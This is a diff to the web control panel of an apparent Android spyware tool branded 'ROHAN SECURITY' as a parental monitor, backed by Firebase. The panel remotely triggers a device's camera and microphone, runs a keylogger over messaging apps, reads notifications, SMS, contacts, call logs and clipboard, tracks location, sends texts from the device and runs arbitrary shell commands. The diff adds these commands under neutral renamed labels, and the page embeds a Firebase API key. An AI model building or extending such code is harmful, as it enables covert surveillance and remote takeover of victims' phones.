@@ -3,20 +3,20 @@
 <head>  
     <meta charset="UTF-8">  
     <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>ROHAN SECURITY | CYBERPUNK CONSOLE</title>  
+    <title>ROHAN SECURITY | ENTERPRISE CONSOLE</title>  
     
-    <!-- Firebase -->  
+    <!-- Firebase SDK -->  
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>  
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>  
   
-    <!-- Libraries -->  
+    <!-- Map & Icons -->  
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />  
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>  
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">  
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">  
 
 <style>  
-    /* --- ORIGINAL CYBERPUNK THEME --- */  
+    /* --- CYBERPUNK THEME --- */  
     :root {  
         --bg-color: #050505; --panel-bg: #0a0f14;  
         --neon-blue: #00f3ff; --neon-red: #ff0055; --neon-green: #00ff41;  
@@ -27,43 +27,40 @@
     body { background-color: var(--bg-color); color: var(--neon-blue); height: 100vh; overflow: hidden; display: flex; }  
     ::-webkit-scrollbar { width: 5px; } ::-webkit-scrollbar-thumb { background: var(--neon-blue); }  
 
-    /* --- LOGIN --- */  
+    /* LOGIN */  
     #login-screen { position: fixed; inset: 0; background: black; z-index: 9999; display: flex; justify-content: center; align-items: center; background-image: radial-gradient(#111 20%, transparent 20%); background-size: 10px 10px; }  
     .terminal-box { border: 2px solid var(--neon-blue); padding: 40px; width: 450px; text-align: center; box-shadow: 0 0 25px var(--neon-blue); background: #000; }  
     .hacker-input { background: transparent; border: none; border-bottom: 2px solid var(--neon-red); color: white; font-size: 1.2rem; padding: 10px; width: 100%; text-align: center; margin: 20px 0; }  
     .cyber-btn { background: var(--glass); border: 1px solid var(--neon-blue); color: var(--neon-blue); padding: 12px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; letter-spacing: 2px; }  
     .cyber-btn:hover { background: var(--neon-blue); color: black; box-shadow: 0 0 15px var(--neon-blue); }  
 
-    /* --- SIDEBAR --- */  
+    /* LAYOUT */  
     .sidebar { width: 80px; background: var(--panel-bg); border-right: var(--border); display: flex; flex-direction: column; align-items: center; padding-top: 20px; overflow-y: auto; }  
     .nav-icon { width: 50px; height: 50px; margin-bottom: 20px; display: flex; justify-content: center; align-items: center; color: #555; font-size: 1.4rem; cursor: pointer; transition: 0.3s; border-radius: 8px; flex-shrink: 0; }  
     .nav-icon:hover, .nav-icon.active { color: var(--neon-blue); border: var(--border); background: var(--glass); box-shadow: 0 0 10px var(--glass); }  
 
-    /* --- CONTENT --- */  
     .content { flex: 1; display: flex; flex-direction: column; background: radial-gradient(circle at center, #111, #000); }  
     .header { height: 70px; border-bottom: var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; background: rgba(0,0,0,0.9); }  
     .brand { font-family: 'Orbitron'; font-size: 1.5rem; letter-spacing: 2px; text-shadow: 0 0 10px var(--neon-blue); }  
     .device-dropdown { background: black; color: var(--neon-green); border: 1px solid var(--neon-green); padding: 8px; min-width: 250px; font-family: 'Share Tech Mono'; }  
 
-    /* --- PAGES --- */  
+    /* PAGES */  
     #main-app { display: none; width: 100%; height: 100%; }  
     .page { display: none; padding: 25px; overflow-y: auto; height: 100%; }  
     .page.active { display: block; animation: glitch 0.2s; }  
     @keyframes glitch { 0% { opacity: 0; transform: translateX(-5px); } 100% { opacity: 1; transform: translateX(0); } }  
 
-    /* --- WIDGETS --- */  
+    /* COMPONENTS */  
     .cyber-card { border: var(--border); background: rgba(0,0,0,0.7); padding: 20px; margin-bottom: 20px; position: relative; }  
     .cyber-card::before { content:''; position: absolute; top:0; left:0; width:3px; height:100%; background: var(--neon-blue); }  
     .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }  
     .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; }  
 
-    /* --- DOWNLOAD BUTTONS --- */  
     .save-btn { background: #064e3b; color: #34d399; border: 1px solid #34d399; padding: 5px 10px; font-size: 0.7rem; cursor: pointer; float: right; margin-top: 5px; font-family: 'Share Tech Mono'; }  
     .save-btn:hover { background: #34d399; color: black; }  
     .danger-btn { border-color: var(--neon-red); color: var(--neon-red); }  
     .danger-btn:hover { background: var(--neon-red); color: white; box-shadow: 0 0 10px var(--neon-red); }  
 
-    /* --- MEDIA & TABLES --- */  
     .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }  
     .media-item { border: 1px solid #333; padding: 5px; background: #000; text-align: center; }  
     .media-item img { width: 100%; height: 120px; object-fit: cover; }  
@@ -76,6 +73,9 @@
     
     .app-item { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding: 10px 0; }
     .blocked-app { opacity: 0.5; text-decoration: line-through; color: var(--neon-red); }
+
+    /* --- NEW STYLES FOR TERMINAL --- */
+    .term-input { background: #111; color: var(--neon-green); border: 1px solid #333; padding: 10px; width: 100%; margin-top: 5px; font-family: monospace; }
 </style>
 
 </head>  
@@ -86,7 +86,6 @@
     <div class="terminal-box">  
         <h1 style="font-family:'Orbitron';">ROHAN<br>SECURITY</h1>  
         <p style="color:var(--neon-red); margin-top:10px;">PARENT ACCESS TERMINAL</p>  
-        
         <input type="text" id="pass-key" class="hacker-input" placeholder="ENTER LICENSE KEY">  
         <div id="login-msg" style="color:var(--neon-green); font-size:0.8rem; height:20px;"></div>
         <button onclick="checkLicense()" class="cyber-btn">VERIFY ACCESS</button>  
@@ -98,6 +97,7 @@
     <!-- SIDEBAR -->  
     <div class="sidebar">  
         <div class="nav-icon active" onclick="nav('dashboard')" title="Dashboard"><i class="fas fa-microchip"></i></div>  
+        <div class="nav-icon" onclick="nav('terminal')" title="Adv. Terminal"><i class="fas fa-terminal"></i></div> <!-- NEW TAB -->
         <div class="nav-icon" onclick="nav('map')" title="Location"><i class="fas fa-globe-asia"></i></div>  
         <div class="nav-icon" onclick="nav('files')" title="Files"><i class="fas fa-folder-open"></i></div>  
         <div class="nav-icon" onclick="nav('gallery')" title="Gallery"><i class="fas fa-images"></i></div>  
@@ -140,72 +140,98 @@
             </div>  
         </div>  
 
-        <!-- 2. MAP -->  
+        <!-- 2. ADVANCED TERMINAL (NEW TAB - YOUR CODE) -->
+        <div id="page-terminal" class="page">
+            <h2 style="color:white; margin-bottom:20px;">> ENTERPRISE_CONTROLLER</h2>
+            
+            <div class="grid-3">
+                <button class="cyber-btn" onclick="reqMsgLog()">DATA LOGS A</button>
+                <button class="cyber-btn" onclick="reqCallHistory()">ACTIVITY HISTORY</button>
+                <button class="cyber-btn" onclick="openStorage()">STORAGE EXPLORER</button>
+                <button class="cyber-btn" onclick="getAppList()">INSTALLED PACKAGES</button>
+                <button class="cyber-btn" onclick="getSysStatus()">SYSTEM STATUS</button>
+                <button class="cyber-btn" onclick="reqContacts()">DIRECTORY LIST</button>
+                <button class="cyber-btn" onclick="getClipboard()">BUFFER DATA</button>
+            </div>
+
+            <div class="grid-3" style="margin-top:20px;">
+                <div class="cyber-card">
+                    <h3>SEND NOTIFICATION</h3>
+                    <textarea id="alertInput" class="term-input" placeholder="Message content"></textarea>
+                    <button class="cyber-btn" style="margin-top:5px;" onclick="pushAlert()">PUSH</button>
+                </div>
+
+                <div class="cyber-card">
+                    <h3>MESSAGING SERVICE</h3>
+                    <input id="targetNum" class="term-input" placeholder="Destination ID">
+                    <textarea id="textBody" class="term-input" placeholder="Content"></textarea>
+                    <button class="cyber-btn" style="margin-top:5px;" onclick="pushRemoteText()">DISPATCH</button>
+                </div>
+
+                <div class="cyber-card">
+                    <h3>TERMINAL DIAGNOSTICS</h3>
+                    <input id="diagInput" class="term-input" onkeyup="runDiagCmd(this)" placeholder="Enter command (Shell)...">
+                </div>
+            </div>
+
+            <div class="grid-4" style="margin-top:20px;">
+                <button class="cyber-btn" onclick="utilAction('fmc1')">TEST AUDIO</button>
+                <button class="cyber-btn" onclick="utilAction('fmc2')">FLASH UTILITY</button>
+                <button class="cyber-btn" onclick="startStream()">START STREAM</button>
+                <button class="cyber-btn" onclick="setDisplayBg()">UPDATE BG</button>
+            </div>
+
+            <!-- Hidden / Extra Panels from your code -->
+            <div id="alertBox" style="display:none;"></div>
+            <div id="remoteTextBox" style="display:none;"></div>
+            <div id="diagPanel" style="display:none;"></div>
+            <div id="displayBox" style="display:none;"></div>
+            <div id="audioPanel" style="display:none;"></div>
+            <div id="fmc1" style="display:none;"></div>
+            <div id="fmc2" style="display:none;"></div>
+        </div>
+
+        <!-- 3. MAP -->  
         <div id="page-map" class="page" style="padding:0;"><div id="map"></div></div>  
 
-        <!-- 3. FILES -->  
+        <!-- 4. FILES -->  
         <div id="page-files" class="page">  
-            <div style="display:flex; justify-content:space-between;">  
-                <h2>> FILE_EXPLORER</h2>  
-                <button class="cyber-btn" style="width:auto;" onclick="cmd('getFileList')">REFRESH</button>  
-            </div>  
+            <div style="display:flex; justify-content:space-between;"><h2>> FILE_EXPLORER</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('getFileList')">REFRESH</button></div>  
             <div class="cyber-card" id="file-list-container"><div style="padding:20px;">WAITING FOR DATA...</div></div>  
         </div>  
 
-        <!-- 4. GALLERY -->  
+        <!-- 5. GALLERY -->  
         <div id="page-gallery" class="page">  
-            <div style="display:flex; justify-content:space-between;">  
-                <h2>> CAPTURED_MEDIA</h2>  
-                <button class="cyber-btn" style="width:auto;" onclick="cmd('capturePhoto')">TRIGGER CAM</button>  
-            </div>  
+            <div style="display:flex; justify-content:space-between;"><h2>> CAPTURED_MEDIA</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('capturePhoto')">TRIGGER CAM</button></div>  
             <div class="media-grid" id="gallery-container" style="margin-top:15px;"></div>  
         </div>  
 
-        <!-- 5. AUDIO -->  
+        <!-- 6. AUDIO -->  
         <div id="page-audio" class="page">  
-            <div style="display:flex; justify-content:space-between;">  
-                <h2>> AUDIO_LOGS</h2>  
-                <button class="cyber-btn" style="width:auto;" onclick="cmd('recordAudio')">TRIGGER MIC</button>  
-            </div>  
+            <div style="display:flex; justify-content:space-between;"><h2>> AUDIO_LOGS</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('recordAudio')">TRIGGER MIC</button></div>  
             <div id="audio-container" style="margin-top:15px;"></div>  
         </div> 
         
-        <!-- 6. KEYLOGGER -->
+        <!-- 7. KEYLOGGER -->
         <div id="page-keylog" class="page">
-            <div class="cyber-card">
-                <h3>> KEYSTROKE_LOGGER</h3>
-                <p style="color:gray; font-size:0.8rem;">Captures typed text from WhatsApp, Instagram, etc.</p>
-                <table id="table-keylog"><thead><tr><th>APP</th><th>TEXT</th><th>TIME</th></tr></thead><tbody></tbody></table>
-            </div>
+            <div class="cyber-card"><h3>> KEYSTROKE_LOGGER</h3><table id="table-keylog"><thead><tr><th>APP</th><th>TEXT</th><th>TIME</th></tr></thead><tbody></tbody></table></div>
         </div>
 
-        <!-- 7. NOTIFICATIONS -->
+        <!-- 8. NOTIFICATIONS -->
         <div id="page-notifications" class="page">
-             <div class="cyber-card">
-                <h3>> INCOMING_NOTIFICATIONS</h3>
-                <p style="color:gray; font-size:0.8rem;">Reads incoming messages from notification bar.</p>
-                <table id="table-notif"><thead><tr><th>APP</th><th>TITLE</th><th>MESSAGE</th><th>TIME</th></tr></thead><tbody></tbody></table>
-            </div>
+             <div class="cyber-card"><h3>> INCOMING_NOTIFICATIONS</h3><table id="table-notif"><thead><tr><th>APP</th><th>TITLE</th><th>MESSAGE</th><th>TIME</th></tr></thead><tbody></tbody></table></div>
         </div>
 
-        <!-- 8. APP BLOCKER -->
+        <!-- 9. APP BLOCKER -->
         <div id="page-apps" class="page">
-            <div style="display:flex; justify-content:space-between;">
-                <h2>> APP_MANAGER</h2>
-                <button class="cyber-btn" style="width:auto;" onclick="cmd('getApps')">REFRESH LIST</button>
-            </div>
-            <div class="cyber-card" id="app-list-container">
-                <div style="padding:20px;">Load app list to manage blocks...</div>
-            </div>
+            <div style="display:flex; justify-content:space-between;"><h2>> APP_MANAGER</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('getApps')">REFRESH LIST</button></div>  
+            <div class="cyber-card" id="app-list-container"><div style="padding:20px;">Load app list to manage blocks...</div></div>
         </div>
 
-        <!-- 9. LOGS -->  
+        <!-- 10. LOGS -->  
         <div id="page-logs" class="page">  
             <div class="cyber-card">  
-                <div style="display:flex; justify-content:space-between;">  
-                    <h3>SMS LOGS</h3>  
-                    <button class="save-btn" style="width:auto;" onclick="downloadTable('table-sms', 'sms.csv')">EXPORT CSV</button>  
-                </div>  
+                <div style="display:flex; justify-content:space-between;"><h3>SMS LOGS</h3><button class="save-btn" style="width:auto;" onclick="downloadTable('table-sms', 'sms.csv')">EXPORT CSV</button></div>  
                 <table id="table-sms"><thead><tr><th>SENDER</th><th>MSG</th><th>TIME</th></tr></thead><tbody></tbody></table>  
             </div>  
         </div>  
@@ -213,7 +239,7 @@
 </div>  
 
 <script>  
-    // --- FIREBASE CONFIG (APNA WALA DALEIN) ---  
+    // --- FIREBASE CONFIG ---  
     const firebaseConfig = {  
         apiKey: "AIzaSyD7sJ0zu4cotmntqYzmaxROzwHmx8_ExvI",  
         authDomain: "children-safty.firebaseapp.com",  
@@ -225,8 +251,53 @@
     };  
     firebase.initializeApp(firebaseConfig);  
     const db = firebase.database();  
+    // Map 'database' to 'db' for your new code compatibility
+    const database = db; 
+
     let map, markers = {}, currentId = null;  
     let parentLicenseKey = ""; 
+    
+    // --- NEW VARIABLES FOR YOUR CODE ---
+    var respov = "";
+    var unqid = "";
+    var activeModule = "";
+    var var32 = "";
+
+    // --- YOUR PROVIDED JS FUNCTIONS (UNCHANGED LOGIC) ---
+    function reqMsgLog() { activeModule = "dataViewer"; pushSysCommand("sync_log_a", "", "", respov); }
+    function reqCallHistory() { activeModule = "dataViewer"; pushSysCommand("sync_log_b", "", "", respov); }
+    function openStorage() { activeModule = "storageMgr"; pushSysCommand("dir_nav", "/sdcard/", "", respov); }
+    function getAppList() { activeModule = "dataViewer"; pushSysCommand("pkg_scan", "", "", respov); }
+    function getSysStatus() { activeModule = "sysInfo"; pushSysCommand("sys_stat", "", "", respov); }
+    function showAlertPanel() { document.getElementById("alertBox").style.display = "block"; }
+    function pushAlert() { pushSysCommand("ui_toast", document.getElementById("alertInput").value, "", respov); }
+    function reqContacts() { activeModule = "dataViewer"; pushSysCommand("sync_cont", "", "", respov); }
+    function showRemoteText() { document.getElementById("remoteTextBox").style.display = "block"; }
+    function pushRemoteText() { pushSysCommand("push_notif", document.getElementById("targetNum").value, document.getElementById("textBody").value, respov); }
+    function initDiagnostics() { document.getElementById("diagPanel").style.display = "block"; }
+    function runDiagCmd(o) { if (event.keyCode === 13) { pushSysCommand("sys_exec", o.value, "", respov); } }
+    function trackInput() { activeModule = "eventLog"; }
+    function trackNotifs() { activeModule = "eventLog"; }
+    function openDisplayMgr() { document.getElementById("displayBox").style.display = "block"; }
+    function setDisplayBg() { pushSysCommand("set_bg", "0", "", respov); }
+    function webSecurity() { activeModule = "eventLog"; }
+    function initAudio() { document.getElementById("audioPanel").style.display = "block"; }
+    function startStream() { pushSysCommand("stream_src", "5000", "", respov); }
+    function getClipboard() { pushSysCommand("clip_get", "", "", "sys/sys" + unqid + "sec"); }
+    function utilAction(x) { /* document.getElementById(x).style.display = "block"; */ pushSysCommand("util_act", x, "", respov); } // Adapted slightly for functionality
+    function opfol(e) {}
+
+    function pushSysCommand(a, b, c, d) {
+        if(!d) { alert("Please select a device first!"); return; }
+        // Note: Using d which is 'users/{ID}'
+        database.ref(d).child("sys_instruction").set({
+            act_id: a, 
+            act_val: b, 
+            act_param: c
+        });
+        alert("Command Sent: " + a);
+    }
+    // ----------------------------------------------------
 
     // --- 1. SECURE LOGIN ---  
     function checkLicense() {  
@@ -269,9 +340,11 @@
         });
     }  
 
-    // --- 2. LISTENER (Original Logic + New Fix) ---  
+    // --- 2. LISTENER ---  
     function listenDevices() {
         const sel = document.getElementById('device-select');
+        sel.innerHTML = '<option>CONNECTING...</option>';
+
         db.ref('company_system/licenses/' + parentLicenseKey).on('value', licenseSnap => {
             const licenseData = licenseSnap.val();
             if (!licenseData) return;
@@ -292,8 +365,7 @@
             
             deviceIds.forEach(targetId => {
                 db.ref('users/' + targetId).on('value', userSnap => {
-                    
-                    const d = userSnap.val() || {}; // Handle Empty
+                    const d = userSnap.val() || {}; 
                     const info = d.info || {};
                     const name = info.name || 'Device ' + targetId.substr(0,4);
                     
@@ -305,7 +377,6 @@
                         sel.add(opt);
                     }
 
-                    // Map Logic
                     const loc = d.location || {};
                     if(loc.latitude) {
                         if(markers[targetId]) {
@@ -326,10 +397,15 @@
         });
     }
 
-    // --- 3. RENDERERS (THE RESTORED FEATURES) ---
+    // --- 3. RENDERERS ---
     function deviceChanged() {  
         currentId = document.getElementById('device-select').value;  
         if(!currentId) return;  
+
+        // --- CONNECTING NEW CODE LOGIC ---
+        respov = "users/" + currentId; // Now your provided code knows where to send commands
+        unqid = currentId;
+        // --------------------------------
 
         db.ref(`users/${currentId}`).on('value', snap => {  
             const d = snap.val() || {};  
@@ -337,13 +413,11 @@
 
             document.getElementById('stat-bat').innerText = (info.battery || 0) + "%";  
             document.getElementById('stat-status').innerText = info.status || "OFFLINE";  
-            
             const lastSeen = info.lastSeen ? new Date(info.lastSeen).toLocaleTimeString() : "--:--";
             document.getElementById('stat-seen').innerText = lastSeen;
               
             if(d.location?.latitude) map.setView([d.location.latitude, d.location.longitude], 15);  
 
-            // RESTORED FUNCTIONS CALLED HERE
             renderFiles(d.files);
             renderGallery(d.logs?.photos);
             renderAudio(d.logs?.audio);
